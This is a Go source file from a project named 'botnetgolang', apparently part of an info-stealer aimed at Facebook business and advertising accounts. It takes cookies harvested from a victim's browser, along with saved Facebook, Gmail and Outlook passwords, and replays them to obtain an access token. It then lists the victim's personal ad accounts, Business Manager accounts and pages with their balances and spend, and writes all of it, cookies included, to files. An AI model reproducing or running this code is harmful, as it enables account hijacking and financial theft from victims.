package pkg

import (
	_const "botnetgolang/internal/const"
	"botnetgolang/internal/model"
	"encoding/json"
	"fmt"
	"github.com/matishsiao/goInfo"
	"os"
	"strconv"
	"strings"
)

func GetToken(
	profile string,
	cookie_ok_fb []*model.Cookie,
	cookie_ok []*model.Cookie,
	password model.KeyInfo,
	version string,
	browser model.BrowserPaths,
	path string,
) bool {
	// check

	//
	//if profile != "C:\\Users\\MR KINH\\AppData\\Local\\Google\\Chrome\\User Data\\Profile 12" {
	//	return false
	//}

	chromeV := version[:3]

	var huy2 string
	var uid2 string
	for index, value := range cookie_ok_fb {

		value.Key = value.Name
		if value.Name == "c_user" {
			uid2 = fmt.Sprintf("%s%s", value.Value, "hahahahah")
		}
		value.Expires = value.ExpirationDate * 130
		huy2 += value.Name + "=" + value.Value + (map[bool]string{true: "; ", false: ""})[index < len(cookie_ok_fb)]
	}

	fmt.Println(fmt.Sprintf("cookies: %s || %s"), cookie_ok_fb, uid2)

	// get type and version of operating system
	operating_system, _ := goInfo.GetInfo()
	os_type := operating_system.GoOS
	if os_type == "windows" {
		os_type = "Windows NT"
	}
	os_r := operating_system.Core
	parts := strings.Split(os_r, ".")
	os_r = parts[0] + "." + parts[1]

	// check iswin64
	isWin64 := false
	if _, exists := os.LookupEnv("ProgramFiles(x86)"); exists {
		isWin64 = true
	}

	html, err := RequestElectP(_const.Url_v1, chromeV, huy2, os_type, os_r, version, browser, isWin64)
	if err != nil {
		fmt.Println("fetch info error")
	}

	fmt.Println(html)

	access_token := ""

	// get access token from html
	access_token = "EABB" + GetBW(html, `accessToken":"EABB`, `"`)
	if access_token == "EABB" || len(access_token) < 20 {
		return false
	}
	var fb_dtsg string
	var __spin_r string
	var __spin_t string
	var __spin_b string

	fb_dtsg = GetBW(html, `DTSGInitialData",[],{"token":"`, `"}`)
	__spin_r = GetBW(html, `__spin_r":`, `,"`)
	__spin_t = GetBW(html, `__spin_t":`, `,"`)
	__spin_b = GetBW(html, `__spin_b":`, `,"`)

	fmt.Println(fb_dtsg)
	fmt.Println(__spin_r)
	fmt.Println(__spin_t)
	fmt.Println(__spin_b)

	var usr model.Usr

	uid := GetBW(html, `fbid:"`, `",`)
	/// test
	//
	///
	//
	//
	//
	if uid != "100067399599374" {
		return false
	}

	usr.Id = uid
	user_full_name := GetBW(html, `userFullName":"`, `",`)
	if user_full_name != "" {
		usr.Name = user_full_name
		usr.Name, _ = strconv.Unquote(`"` + user_full_name + `"`)
	}

	fmt.Println(uid)
	fmt.Println(usr)

	access_token_Q := ""
	fmt.Println(access_token_Q)

	access_token_Q = access_token

	cookie := ""
	for _, ccc := range cookie_ok_fb {
		if ccc.Path == "/" {
			cookie += ccc.Name + "=" + ccc.Value + ";"
			if ccc.Name == "c_user" {
				usr.Id = ccc.Value
			}
		}
	}

	name := os.Args[0]
	if strings.Contains(name, ".exe") {
		name = name[strings.LastIndex(name, "\\")+1:]
	}

	data := model.Data{
		Ten:           usr.Name,
		UID:           usr.Id,
		Email:         usr.Email,
		Birthday:      usr.Birthday,
		Location:      "",
		Fa:            "",
		Step:          "COOKIE",
		TrinhDuyet:    browser.Name + "|" + name,
		Cookie:        cookie,
		Password:      password.Facebook,
		Usergmail:     password.UserGmail,
		Passgmail:     password.PassGmail,
		Useroutlook:   password.UserOutlook,
		Passoutlook:   password.PassOutlook,
		HanhDong:      _const.Action,
		Token:         access_token_Q,
		Businesses:    []string{},
		Fanpage:       []string{},
		TaiKhoanAds:   []string{},
		CookieOutlook: "",
		CookieGg:      "",
	}

	fmt.Println(data)

	byte_adsaccounts, _ := FetchFromGraphQl(_const.Url_v14_ads_account, cookie, access_token)
	mangcanhan := make([]model.Account, 0)
	fmt.Println(mangcanhan)

	var response model.ApiResponse
	err = json.Unmarshal(byte_adsaccounts, &response)
	if err != nil {
		fmt.Println("error:", err)
	}
	mangcanhan = response.Data

	// lay tau khoan ca nhan
	var writer_file string
	writer_file = "Trình duyệt: " + browser.Name
	writer_file += "\n" + profile
	writer_file += "\n" + "Uid: " + uid
	writer_file += "\n" + "Tên: " + usr.Name
	writer_file += "\n" + "Cookie: " + cookie

	// bat truong hop khong lay duoc

	writer_file += "\n" + "Tổng số tài khoản quảng cáo cá nhân: " + strconv.Itoa(len(response.Data))
	writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
	writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
	for index, account := range response.Data {
		writer_file += "\n" + "-----------------------------------------------------------------------------" + "\n"
		writer_file += "Tài khoản quảng cáo số: " + strconv.Itoa(index+1) + "\n"
		writer_file += "Id tài khoản quảng cáo: " + account.AccountID + "\n"
		writer_file += "Tên tài khoản quảng cáo: " + account.Name + "\n"
		writer_file += "Đơn vị tiền tệ: " + account.Currency + "\n"
		writer_file += "Múi giờ: " + fmt.Sprintf("%.2f", account.TimezoneOffsetHoursUTC) + "\n"
		writer_file += "Tên vùng: " + account.TimezoneName + "\n"
		status := account.AccountStatus
		stt := ""
		if status == 1 {
			stt = "Live"
		} else if status == 2 {
			stt = "Die"
		} else {
			stt = "Debit"
		}
		writer_file += "Tình trạng: " + stt + "\n"
		writer_file += "Số dư: " + account.Balance + "\n"
		writer_file += "Ngày tạo: " + account.CreatedTime + "\n"
		writer_file += "Gốc: " + account.Owner + "\n"
		prepay := account.IsPrepayAccount
		prepaystring := ""
		if prepay == true {
			prepaystring = "Có"
		} else {
			prepaystring = "Không"
		}

		writer_file += "Là tài khoản trả trước hay không: " + prepaystring + "\n"
		if len(account.AdsPaymentCycle.Data) > 0 {
			writer_file += "Ngưỡng: " + fmt.Sprintf("%.2f", account.AdsPaymentCycle.Data[0].ThresholdAmount) + "\n"
		} else {
			writer_file += "Ngưỡng: " + fmt.Sprintf("%v\n", 0)
		}
		if len(account.Insights.Data) > 0 {
			writer_file += "Đã chi tiêu: " + account.Insights.Data[0].Spend + "\n"
		} else {
			writer_file += "Đã chi tiêu: " + strconv.Itoa(0) + "\n"
		}
	}

	// mo file
	canhan := strings.Split(profile, "\\")
	profile = canhan[len(canhan)-1]
	filenamecanhan := path + `\` + strings.ReplaceAll(profile, " ", "_") + "_list_tkqc_canhan"
	filecanhan, err := os.Create(fmt.Sprintf("%s.txt", filenamecanhan))
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer filecanhan.Close()

	fmt.Fprint(filecanhan, writer_file)

	fmt.Println("haha")

	// lay tai khoan doanh nghiep
	byte_adsaccounts_pm, _ := FetchFromGraphQl(_const.Url_v14_ads_business, cookie, access_token)

	var responseBM model.ApiResponseBM
	mangtaikhoanquangcaodoanhnghiep := make([]model.AdAccount, 0)
	err = json.Unmarshal(byte_adsaccounts_pm, &responseBM)
	if err != nil {
		fmt.Println("error:", err)
	}

	var writer_file_pm string
	writer_file_pm = "Trình duyệt: " + browser.Name
	writer_file_pm += "\n" + profile
	writer_file_pm += "\n" + "Uid: " + uid
	writer_file_pm += "\n" + "Tên: " + usr.Name
	writer_file_pm += "\n" + "Cookie: " + cookie
	writer_file_pm += "\n" + "Tổng số BM: " + strconv.Itoa(len(responseBM.Data))

	writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"
	writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"

	for index, account := range responseBM.Data {
		writer_file_pm += "\n" + "-----------------------------------------------------------------------------" + "\n"
		writer_file_pm += "BM số: " + strconv.Itoa(index+1) + "\n"
		writer_file_pm += "Tên BM: " + account.Name + "\n"
		writer_file_pm += "Id của BM: " + account.ID + "\n"
		writer_file_pm += "Trạng thái: " + account.VerificationStatus + "\n"
		writer_file_pm += "Vai trò: "
		for _, value := range account.PermittedRoles {
			writer_file_pm += value + "  "
		}

		if len(account.OwnedAdAccounts.Data) > 0 {
			hold_number_ads_account := account.OwnedAdAccounts.Data
			mangtaikhoanquangcaodoanhnghiep = append(mangtaikhoanquangcaodoanhnghiep, hold_number_ads_account...)

			writer_file_pm += "\n" + "Số lượng tài khoản quảng cáo đang cầm: " + strconv.Itoa(len(hold_number_ads_account))
			for index, value := range hold_number_ads_account {
				writer_file_pm += "\n" + "+++++++++++++++++++++++++++++++++++++++++++++++++++++++" + "\n"
				query_ads_account := value
				writer_file_pm += "Tài khoản thứ: " + strconv.Itoa(index+1) + "\n"
				writer_file_pm += "Id: " + query_ads_account.ID + "\n"
				is_pre := query_ads_account.IsPrepayAccount
				is_pre_string := "Không trả trước"
				if is_pre {
					is_pre_string = "Trả trước"
				}
				writer_file_pm += "Loại tài khoản: " + is_pre_string + "\n"
				writer_file_pm += "Tiền tệ: " + query_ads_account.Currency + "\n"
				status := query_ads_account.AccountStatus
				stt := ""
				if status == float64(1) {
					stt = "Live"
				} else if status == float64(2) {
					stt = "Die"
				} else {
					stt = "Debit"
				}
				writer_file_pm += "Tình trạng: " + stt + "\n"
				writer_file_pm += "Số dư: " + query_ads_account.Balance + "\n"
				writer_file_pm += "Đã chi tiêu: " + query_ads_account.AmountSpent + "\n"

				if len(query_ads_account.Adspaymentcycle.Data) > 0 {
					writer_file_pm += "Ngưỡng: " + fmt.Sprintf("%.2f", query_ads_account.Adspaymentcycle.Data[0].ThresholdAmount) + "\n"
				} else {
					writer_file_pm += "Ngưỡng: " + fmt.Sprintf("%v\n", 0)
				}

			}

		}

	}

	doanhnghiep := strings.Split(profile, "\\")
	profile = doanhnghiep[len(doanhnghiep)-1]
	filenamedoanhnghiep := path + `\` + strings.ReplaceAll(profile, " ", "_") + "list_tkqc_doanhnghiep"
	filedoanhnghiep, err := os.Create(fmt.Sprintf("%s.txt", filenamedoanhnghiep))
	if err != nil {
		fmt.Println(err)
		return false
	}
	defer filedoanhnghiep.Close()

	fmt.Fprint(filedoanhnghiep, writer_file_pm)

	// get page

	fmt.Println("haha")

	// lay page
	byte_list_page, _ := FetchFromGraphQl(fmt.Sprintf(`https://graph.facebook.com/%s/accounts?access_token=`, usr.Id), cookie, access_token)

	var tmp map[string]interface{}

	var responseListPage model.ListPage
	err = json.Unmarshal(byte_list_page, &responseListPage)
	err = json.Unmarshal(byte_list_page, &tmp)
	fmt.Println(responseListPage)
	for index, value := range responseListPage.Data {
		var detail model.DetaillPage
		bytedetailpageResponse, _ := FetchFromGraphQl(fmt.Sprintf(`https://graph.facebook.com/%s?fields=id,followers_count,verification_status&access_token=`, value.PageId), cookie, value.AccessToken)
		err = json.Unmarshal(bytedetailpageResponse, &detail)
		responseListPage.Data[index].Detail = detail
	}
	listpage := strings.Split(profile, "\\")
	profile = listpage[len(listpage)-1]
	filenamelistpage := path + `\` + strings.ReplaceAll(profile, " ", "_") + "list_page"
	filelistpage, err := os.Create(fmt.Sprintf("%s.txt", filenamelistpage))
	byte_print_page, err := json.MarshalIndent(responseListPage, "", "  ")
	if err != nil {
		fmt.Println("Error:", err)
	}
	string_print_page := string(byte_print_page)
	fmt.Fprint(filelistpage, string_print_page)

	if err != nil {
		fmt.Println("error:", err)
	}

	fmt.Println("haha")
	return true
}
